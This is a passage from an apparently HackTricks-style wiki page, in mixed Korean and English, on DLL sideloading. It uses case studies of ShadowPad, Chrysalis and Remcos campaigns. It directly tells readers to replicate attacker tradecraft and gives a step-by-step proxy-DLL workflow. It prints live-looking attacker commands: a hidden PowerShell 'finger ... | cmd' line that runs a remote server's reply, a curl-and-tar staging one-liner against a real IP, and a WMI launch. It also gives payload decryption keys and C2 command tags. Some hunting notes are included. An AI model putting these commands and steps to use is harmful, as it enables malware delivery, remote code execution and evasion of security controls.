- export requirements의 경우, proxying framework(예: DLLirant/Spartacus)를 사용해 payload도 실행하는 forwarding DLL을 생성하세요.

- 이 technique는 host binary의 DLL name resolution에 의존합니다. host가 absolute paths 또는 safe loading flags(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 hijack가 실패할 수 있습니다.
- KnownDLLs, SxS, 그리고 forwarded exports는 precedence에 영향을 줄 수 있으므로 host binary와 export set을 선택할 때 반드시 고려해야 합니다.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point는 Ink Dragon이 ShadowPad를 배포할 때, 정식 software처럼 위장하면서 core payload를 disk에 encrypted 상태로 유지하기 위해 **three-file triad**를 사용했다고 설명했습니다:

1. **Signed host EXE** – AMD, Realtek, NVIDIA 같은 vendor가 악용됩니다 (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). attackers는 executable의 이름을 Windows binary처럼 보이도록 바꾸지만(예: `conhost.exe`), Authenticode signature는 유효한 상태로 남습니다.
2. **Malicious loader DLL** – EXE 옆에 예상되는 이름으로 드롭됩니다 (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL은 보통 ScatterBrain framework로 obfuscate된 MFC binary이며, 역할은 encrypted blob을 찾아 decrypt한 뒤 ShadowPad를 reflectively map하는 것뿐입니다.
3. **Encrypted payload blob** – 보통 같은 디렉터리에 `<name>.tmp`로 저장됩니다. decrypted payload를 memory-mapping한 뒤 loader는 TMP 파일을 삭제해 forensic evidence를 지웁니다.

Tradecraft notes:

* Signed EXE의 이름을 바꾸되(PE header의 원래 `OriginalFileName`은 유지), Windows binary처럼 위장하면서도 vendor signature를 유지할 수 있으므로, 실제로는 AMD/NVIDIA utility인데 `conhost.exe`처럼 보이도록 드롭하는 Ink Dragon의 습관을 그대로 재현하세요.
* executable이 계속 trusted 상태이므로, 대부분의 allowlisting control은 악성 DLL만 옆에 있으면 됩니다. loader DLL 커스터마이징에 집중하세요. signed parent는 보통 손대지 않은 채로 실행할 수 있습니다.
* ShadowPad decryptor는 TMP blob이 loader 옆에 있고 writable 상태여서 mapping 후 파일을 zero 처리할 수 있기를 기대합니다. payload가 메모리에 올라갈 때까지 디렉터리를 writable로 유지하세요. 일단 메모리에 올라가면 TMP 파일은 OPSEC상 안전하게 삭제할 수 있습니다.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

operators는 DLL sideloading과 LOLBAS를 함께 사용해, disk에 남는 custom artifact가 trusted EXE 옆의 malicious DLL 하나뿐이 되게 만듭니다:

- **Remote command loader (Finger):** Hidden PowerShell이 `cmd.exe /c`를 실행하고 Finger server에서 command를 받아 `cmd`로 파이프합니다:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`는 TCP/79 text를 가져오고, `| cmd`는 server response를 실행하므로 operators가 second stage server-side를 교체할 수 있습니다.

- **Built-in download/extract:** benign extension을 가진 archive를 다운로드하고, unpack한 뒤, 랜덤 `%LocalAppData%` 폴더 아래에 sideload target과 DLL을 stage합니다:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L`은 progress를 숨기고 redirects를 따라가며, `tar -xf`는 Windows 내장 tar를 사용합니다.

- **WMI/CIM launch:** WMI를 통해 EXE를 시작하면 telemetry에 CIM-created process로 보이면서 colocated DLL을 로드합니다:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- local DLL을 선호하는 binary(예: `intelbq.exe`, `nearby_share.exe`)와 함께 동작하며, payload(예: Remcos)는 trusted name 아래에서 실행됩니다.

- **Hunting:** `/p`, `/m`, `/c`가 함께 나타나는 `forfiles`에 alert를 걸세요. admin scripts 외에는 드뭅니다.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

최근 Lotus Blossom intrusion은 신뢰된 update chain을 악용해 NSIS-packed dropper를 전달했고, 이를 통해 DLL sideload와 fully in-memory payload를 stage했습니다.

Tradecraft flow
- `update.exe` (NSIS)가 `%AppData%\Bluetooth`를 만들고 **HIDDEN**으로 표시한 뒤, 이름을 바꾼 Bitdefender Submission Wizard `BluetoothService.exe`, 악성 `log.dll`, 암호화된 blob `BluetoothService`를 드롭하고 EXE를 실행합니다.
- host EXE는 `log.dll`을 import하고 `LogInit`/`LogWrite`를 호출합니다. `LogInit`는 blob을 mmap-load하고, `LogWrite`는 **0x19660D** / **0x3C6EF35F** 상수를 쓰는 custom LCG-based stream으로 이를 decrypt한 뒤, 이전 hash에서 파생된 key material을 사용해 buffer를 plaintext shellcode로 덮어쓰고, temp를 해제한 후 그곳으로 점프합니다.
- IAT를 피하기 위해 loader는 **FNV-1a basis 0x811C9DC5 + prime 0x1000193**로 export name을 hash한 뒤 Murmur-style avalanche(**0x85EBCA6B**)를 적용하고 salted target hash와 비교해 API를 resolve합니다.

Main shellcode (Chrysalis)
- key `gQ2JR&9;`를 사용해 add/XOR/sub를 다섯 번 반복하여 PE-like main module을 decrypt한 뒤, `Kernel32.dll` → `GetProcAddress`를 동적으로 로드해 import resolution을 마무리합니다.
- 문자별 bit-rotate/XOR transform으로 runtime에 DLL name string을 재구성한 다음 `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`를 로드합니다.
- 두 번째 resolver는 **PEB → InMemoryOrderModuleList**를 순회하고, 각 export table을 4-byte block으로 Murmur-style mixing 해시로 파싱하며, hash를 찾지 못했을 때만 `GetProcAddress`로 fallback합니다.

Embedded configuration & C2
- config는 드롭된 `BluetoothService` 파일의 **offset 0x30808**(size **0x980**)에 있으며, key `qwhvb^435h&*7`로 RC4-decrypt되어 C2 URL과 User-Agent를 드러냅니다.
- beacon은 dot-delimited host profile을 만들고 tag `4Q`를 앞에 붙인 뒤, HTTPS로 `HttpSendRequestA`를 보내기 전에 key `vAuig34%^325hGV`로 RC4-encrypt합니다. response는 RC4-decrypt되어 tag switch(`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases)로 분기됩니다.
- execution mode는 CLI args로 제어됩니다: args 없음 = `-i`를 가리키는 persistence(service/Run key) 설치; `-i` = `-k`로 자기 자신 재실행; `-k` = install을 건너뛰고 payload 실행.

Alternate loader observed
- 같은 intrusion에서 Tiny C Compiler를 드롭하고 `C:\ProgramData\USOShared\`에서 `svchost.exe -nostdlib -run conf.c`를 `libtcc.dll`과 함께 실행했습니다. attacker-supplied C source가 shellcode를 embedded한 뒤 컴파일하고, PE를 disk에 쓰지 않고 memory에서 실행했습니다. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- This TCC-based compile-and-run stage imported `Wininet.dll` at runtime and pulled a second-stage shellcode from a hardcoded URL, giving a flexible loader that masquerades as a compiler run.

## Signed-host sideloading with export proxying + host thread parking

Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.

Observed pattern
- Drop a trusted EXE beside a malicious DLL using the expected dependency name such as `version.dll`.
- The malicious DLL **proxies every expected export** back to the real system DLL (for example `%SystemRoot%\\System32\\version.dll`) so import resolution still succeeds and the host process keeps working.
- After load, the malicious DLL **patches the host entry point** so the main thread falls into an infinite `Sleep` loop instead of exiting or running code paths that would terminate the process.
- A new thread performs the real malicious work: decrypting the next-stage DLL name or path (RC4/XOR are common), then launching it with `LoadLibrary`.

Why this matters
- Normal DLL proxying preserves API compatibility, but it doesn't guarantee the host stays alive long enough for later stages.
- Parking the main thread in `Sleep(INFINITE)` is a simple way to keep the signed process resident while the loader performs decryption, staging, or network bootstrap in a worker thread.
- Hunting only for a suspicious `DllMain` miss this pattern if the interesting behavior happens after the host entry point is patched and a secondary thread starts.

Minimal workflow
1. Copy the signed host EXE and determine the DLL it resolves from the local directory.
2. Build a proxy DLL exporting the same functions and forwarding them to the legitimate DLL.
3. In `DllMain(DLL_PROCESS_ATTACH)`, create a worker thread.
4. From that thread, patch the host entry point or main thread start routine so it loops on `Sleep`.
5. Decrypt the next-stage DLL name/config and call `LoadLibrary` or manual-map the payload.

Defensive pivots
- Signed processes loading `version.dll` or similarly common libraries from their own application directory instead of `System32`.
- Memory patches at the process entry point shortly after image load, especially jumps/calls redirected to `Sleep`/`SleepEx`.
- Threads created by a proxy DLL that immediately call `LoadLibrary` on a second DLL with a decrypted name.
- Full-export proxy DLLs placed next to vendor executables inside writable staging directories such as `ProgramData`, `%TEMP%`, or unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
